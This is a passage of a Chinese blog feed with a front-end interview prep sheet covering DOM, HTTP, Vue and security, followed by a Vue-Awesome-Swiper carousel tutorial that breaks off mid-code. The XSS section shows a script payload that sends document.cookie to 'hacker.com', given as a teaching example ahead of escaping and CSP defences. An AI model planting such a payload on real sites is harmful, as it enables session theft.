class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        <span class="keyword">this</span>.body = &#x27;肉体&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    move()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    constructor(name)&#123;</span><br><span class="line">        <span class="keyword">super</span>()</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">    &#125;,</span><br><span class="line">    useTools()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> frank = <span class="keyword">new</span> <span class="type">Human</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ol start="14"><li>&#x3D;&#x3D; 相关题目直接反着答（放弃）</li></ol><p>DOM 押题</p><ol><li><p>DOM 事件模型是什么？(这题已经过时啦)</p><ol><li>冒泡</li><li>捕获</li><li><a href="http://jsbin.com/raqakog/1/edit?js,console,output" title="null">如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的</a>。</li></ol></li><li><p>移动端的触摸事件了解吗？</p><ol><li>touchstart touchmove touchend touchcancel</li><li>模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。</li></ol></li><li><p>事件委托是什么？有什么好处？</p><ol><li><p>假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。</p></li><li><p>可以监听还没有出生的儿子（动态生成的元素）。省监听器。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">listen</span>(element, eventType, selector, fn)&#123;</span><br><span class="line"> element<span class="selector-class">.addEventListener</span>(eventType, e=&gt;&#123;</span><br><span class="line">     <span class="built_in">if</span>(e<span class="selector-class">.target</span><span class="selector-class">.matches</span>(selector))&#123;</span><br><span class="line">         fn<span class="selector-class">.call</span>(el, e, el)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;<span class="comment">// 有 bug 但是可以应付面试官的事件委托</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span><br><span class="line"> element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</span><br><span class="line">     <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</span><br><span class="line">     <span class="keyword">while</span> (!el.matches(selector)) &#123;</span><br><span class="line">         <span class="keyword">if</span> (element === <span class="keyword">el</span>) &#123;</span><br><span class="line">             <span class="keyword">el</span> = null</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"> <span class="keyword">return</span> element</span><br><span class="line">&#125; // 工资 <span class="number">12</span><span class="keyword">k</span>+ 的前端写的事件委托</span><br><span class="line">listen(ul, <span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;li&#x27;</span>, ()=&gt;&#123;&#125;)</span><br><span class="line"></span><br><span class="line">ul&gt;li*<span class="number">5</span>&gt;span</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol><p>HTTP 押题</p><ol><li>HTTP 状态码知道哪些？</li><li>301 和 302 的区别是什么？<ol><li>301 永久重定向，浏览器会记住</li><li>302 临时重定向</li></ol></li><li>HTTP 缓存怎么做？<ol><li>Cache-Control: max-age&#x3D;300</li><li><a href="http://cdn.com/1.js?v=1" title="null">http://cdn.com/1.js?v=1</a> 避开缓存</li></ol></li><li>Cache-Control 和 Etag 的区别是什么？</li><li>Cookie 是什么？Session 是什么？<ul><li>Cookie<ol><li>HTTP响应通过 Set-Cookie 设置 Cookie</li><li>浏览器访问指定域名是必须带上 Cookie 作为 Request Header</li><li>Cookie 一般用来记录用户信息</li></ol></li><li>Session<ol><li>Session 是服务器端的内存（数据）</li><li>Session 一般通过在 Cookie 里记录 SessionID 实现</li><li>SessionID 一般是随机数</li></ol></li></ul></li><li>LocalStorage 和 Cookie 的区别是什么？<ol><li>Cookie 会随请求被发到服务器上，而 LocalStorage 不会</li><li>Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右</li></ol></li><li>（必考）GET 和 POST 的区别是什么？<ol><li>参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。</li><li>安全（扯淡）。GET 没有 POST 安全（都不安全）</li><li>GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）</li><li>包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）</li><li>GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）</li></ol></li><li>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？<ol><li>JSONP</li><li>CORS</li><li>postMessage 看一下 MDN</li></ol></li></ol><p>Vue 押题</p><ol><li><p>（必考）Vue 有哪些生命周期钩子函数？</p><ul><li>看文档：<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" title="null">https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90</a></li></ul></li><li><p>（必考）Vue 如何实现组件通信？</p><ol><li>父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）</li><li>爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）</li><li><a href="https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1" title="null">兄弟通信（new Vue() 作为 eventBus）</a></li></ol></li><li><p>Vuex 的作用是什么？</p><ul><li>看文档、博客 <a href="https://vuex.vuejs.org/zh-cn/intro.html" title="null">https://vuex.vuejs.org/zh-cn/intro.html</a></li></ul></li><li><p>VueRouter 路由是什么？</p><ul><li>看文档、博客</li></ul></li><li><p>Vue 的双向绑定是如何实现的？有什么缺点？</p><ul><li>看文档，<a href="https://cn.vuejs.org/v2/guide/reactivity.html" title="null">深入响应式原理</a></li></ul></li><li><p>Computed 计算属性的用法？跟 Methods 的区别。<br><a href="https://zhuanlan.zhihu.com/p/33778594" title="null">https://zhuanlan.zhihu.com/p/33778594</a></p></li></ol><p>算法押题</p><ol><li>排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）</li><li>二分查找法</li><li>翻转二叉树</li></ol><p>把上面三个背一下，算法题必过。</p><p>安全押题</p><ol><li>什么是 XSS 攻击？如何预防？<ul><li><p>举例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = userComment  // userComment 内容是 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">get</span>(<span class="string">&#x27;http://hacker.com?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// 恶意就被执行了，这就是 XSS</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>预防</p><ol><li>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行</li><li>如果你一样要用 innerHTML，字符过滤<ul><li>把 &lt; 替换成 <code>&amp;lt;</code></li><li>把 &gt; 替换成 <code>&amp;gt;</code></li><li>把 &amp; 替换成 <code>&amp;amp;</code></li><li>把 ‘ 替换成 <code>&amp;#39;</code></li><li>把 ‘ 替换成 <code>&amp;quot;</code></li><li>代码 div.innerHTML &#x3D; userComment.replace(&#x2F;&gt;&#x2F;g, ‘<code>&amp;lt;</code>‘).replace…</li></ul></li><li>使用 CSP Content Security Policy</li></ol></li></ul></li><li>什么是 CSRF 攻击？如何预防？<ul><li>过程<ol><li>用户在 qq.com 登录</li><li>用户切换到 hacker.com（恶意网站）</li><li>hacker.com 发送一个 qq.com&#x2F;add_friend 请求，让当前用户添加 hacker 为好友。</li><li>用户在不知不觉中添加 hacker 为好友。</li><li>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。</li></ol></li><li>避免<ol><li>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求</li><li>csrf_token 来解决</li></ol></li></ul></li></ol><p>Webpack 题</p><ol><li>转译出的文件过大怎么办？<ul><li>使用 code split</li><li>写法 import(‘xxx’).then(xxx&#x3D;&gt;{console.log(xxx)})</li><li>xxx 模块就是按需加载的</li></ul></li><li>转译速度慢什么办？</li><li>写过 webpack loader 吗？<ul><li><a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" title="null">http://www.alloyteam.com/2016/01/webpack-loader-1/</a></li></ul></li></ol><p>发散题</p><ol><li><p>从输入 URL 到页面展现中间发生了什么？</p><ol><li>DNS 查询 DNS 缓存</li><li>建立 TCP 连接（三次握手）连接复用</li><li>发送 HTTP 请求（请求的四部分）</li><li>后台处理请求<ol><li>监听 80 端口</li><li>路由</li><li>渲染 HTML 模板</li><li>生成响应</li></ol></li><li>发送 HTTP 响应</li><li>关闭 TCP 连接（四次挥手）</li><li>解析 HTML</li><li>下载 CSS（缓存</li><li>解析 CSS</li><li>下载 JS（缓存</li><li>解析 JS</li><li>下载图片</li><li>解析图片</li><li>渲染 DOM 树</li><li>渲染样式树</li><li>执行 JS</li></ol></li><li><p>你没有工作经历吗？</p><ul><li>一开始就问，可以拜拜。</li><li>中间问最后问，他想压价。</li><li>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。</li></ul></li><li><p>你遇到过最难的问题是什么？<br><a href="https://www.zhihu.com/question/35323603/answer/338796153" title="null">https://www.zhihu.com/question/35323603/answer/338796153</a></p></li><li><p>你的期望薪资是多少？<br>你想要的工资 加 1000~2000。</p></li><li><p>（任何你不会的问题）</p><ol><li>承认不会</li><li>询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？</li><li>根据面试官的回答，向有利于自己的方向引导话题。</li></ol></li></ol><p>刁钻代码题</p><ol><li><p>map加parseInt</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[1,2,3]</span><span class="selector-class">.map</span>(parseInt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">1</span>,<span class="number">0</span>, array)</span></span> <span class="comment">// 1</span></span><br><span class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">2</span>,<span class="number">1</span>, array)</span></span> <span class="comment">// NaN</span></span><br><span class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">3</span>,<span class="number">2</span>, array)</span></span> <span class="comment">// NaN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>a.x &#x3D; a &#x3D; {}</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;n:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">a.x = a = &#123;n:<span class="number">2</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>问 a.x 是多少？</p></li></ol><p><img src="/Blog/2018/05/21/interview/2018%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/index/img.png"><br>3.  (a &#x3D;&#x3D;1 &amp;&amp; a&#x3D;&#x3D; 2 &amp;&amp; a&#x3D;&#x3D;3) 可能为 true 吗？</p><pre><code><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = &#123;</span><br><span class="line">  value: <span class="number">0</span>,</span><br><span class="line">  <span class="built_in">toString</span>()&#123;</span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.value</span> += <span class="number">1</span></span><br><span class="line">    return <span class="selector-tag">a</span><span class="selector-class">.value</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue-Awesome-Swiper</title>
      <link href="/Blog/2018/01/11/vue/%E5%85%B3%E4%BA%8EVueAwesomeSwiper%E5%9C%A8VUE%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/index/"/>
      <url>/Blog/2018/01/11/vue/%E5%85%B3%E4%BA%8EVueAwesomeSwiper%E5%9C%A8VUE%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>轮播图插件，可以同时支持Vue.js（1.X ~ 2.X），兼顾PC和移动端，随着vue的广泛使用，其中插件swiper也算是使用的比较频繁的插件，现在分享一下使用方法以及开发中会遇到的一些问题。</p></blockquote><p>我们先下载包，然后去main.js里面配置。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install </span>vue-awesome-<span class="keyword">swiper </span>--save</span><br></pre></td></tr></table></figure><p>我们可以用import的方法</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//import</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueAwesomeSwiper <span class="keyword">from</span> <span class="string">&#x27;vue-awesome-swiper&#x27;</span></span><br></pre></td></tr></table></figure><p>也可以用require</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">var</span> <span class="variable">Vue</span> = <span class="function"><span class="title">require</span>(<span class="string">&#x27;vue&#x27;</span>)</span></span><br><span class="line"><span class="variable">var</span> <span class="variable">VueAwesomeSwiper</span> = <span class="function"><span class="title">require</span>(<span class="string">&#x27;vue-awesome-swiper&#x27;</span>)</span></span><br></pre></td></tr></table></figure><p>两者都可以达到目的，然后再mian.js里面全局注册</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.<span class="keyword">use</span>(VueAwesomeSwiper)</span><br></pre></td></tr></table></figure><p>在模板里使用</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; swiper, swiperSlide &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-awesome-swiper&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    swiper,</span><br><span class="line">    swiperSlide</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">:options</span>=<span class="string">&quot;swiperOption&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;mySwiper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- slides --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">swiper-slide</span> <span class="attr">v-for</span>=<span class="string">&quot;slide in swiperSlides&quot;</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;&#123; &#x27;background-image&#x27;: &#x27;url(&#x27; + slide + &#x27;)&#x27; &#125;&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;slide.id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">swiper-slide</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Optional controls --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-pagination&quot;</span> <span class="attr">slot</span>=<span class="string">&quot;pagination&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-prev&quot;</span> <span class="attr">slot</span>=<span class="string">&quot;button-prev&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-next&quot;</span> <span class="attr">slot</span>=<span class="string">&quot;button-next&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; swiper, swiperSlide &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-awesome-swiper&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;carrousel&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    swiper,</span></span><br><span class="line"><span class="language-javascript">    swiperSlide</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  data () &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">swiperOption</span>: &#123; <span class="comment">//以下配置不懂的，可以去swiper官网看api，链接http://www.swiper.com.cn/api/</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">notNextTick</span>: <span class="literal">true</span>, <span class="comment">// notNextTick是一个组件自有属性，如果notNextTick设置为true，组件则不会通过NextTick来实例化swiper，也就意味着你可以在第一时间获取到swiper对象，假如你需要刚加载遍使用获取swiper对象来做什么事，那么这个属性一定要是true</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">autoplay</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">loop</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">direction</span>: <span class="string">&#x27;horizontal&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">grabCursor</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">setWrapperSize</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">autoHeight</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">pagination</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">el</span>: <span class="string">&#x27;.swiper-pagination&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">centeredSlides</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">paginationClickable</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">navigation</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">nextEl</span>: <span class="string">&#x27;.swiper-button-next&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">prevEl</span>: <span class="string">&#x27;.swiper-button-prev&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">keyboard</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">mousewheelControl</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">observeParents</span>: <span class="literal">true</span>, <span class="comment">// 如果自行设计了插件，那么插件的一些配置相关参数，也应该出现在这个对象中，如下debugger</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">debugger</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">swiperSlides</span>: [<span class="string">&#x27;../../static/img/swiper1.jpg&#x27;</span>, <span class="string">&#x27;../../static/img/swiper2.jpg&#x27;</span>, <span class="string">&#x27;../../static/img/swiper3.jpg&#x27;</span>, <span class="string">&#x27;../../static/img/swiper4.jpg&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">html</span>, <span class="selector-tag">body</span>, <span class="selector-id">#app</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.swiper-container-autoheight</span>, <span class="selector-class">.swiper-container-autoheight</span> <span class="selector-class">.swiper-slide</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.swiper-pagination-bullet</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.swiper-pagination-fraction</span>, <span class="selector-class">.swiper-pagination-custom</span>, <span class="selector-class">.swiper-container-horizontal</span> &gt; <span class="selector-class">.swiper-pagination-bullets</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">bottom</span>: <span class="number">8%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以正常使用了，但是以下是一些开发中遇到的一些问题。</p><blockquote><p>很多人在引入swiper的时候会出现小点swiper-pagination出不来或者一些配置属性没有生效。原因是现在最新的swiper版本已经开始区分组件和普通版本了。<br>在低版本swiper中，我们可以这么写(我相信大部分童鞋百度，论坛到的使用方法大多是这样子的)</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// swiper options example:</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;carrousel&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">swiperOption</span>:</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">notNextTick</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// swiper configs 所有的配置同swiper官方api配置</span></span></span><br><span class="line"><span class="language-javascript">          <span class="attr">autoplay</span>: <span class="number">3000</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">direction</span>: <span class="string">&#x27;vertical&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">grabCursor</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">setWrapperSize</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">autoHeight</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">pagination</span>: <span class="string">&#x27;.swiper-pagination&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">paginationClickable</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">prevButton</span>: <span class="string">&#x27;.swiper-button-prev&#x27;</span>,<span class="comment">//上一张</span></span></span><br><span class="line"><span class="language-javascript">          <span class="attr">nextButton</span>: <span class="string">&#x27;.swiper-button-next&#x27;</span>,<span class="comment">//下一张</span></span></span><br><span class="line"><span class="language-javascript">          <span class="attr">scrollbar</span>: <span class="string">&#x27;.swiper-scrollbar&#x27;</span>,<span class="comment">//滚动条</span></span></span><br><span class="line"><span class="language-javascript">          <span 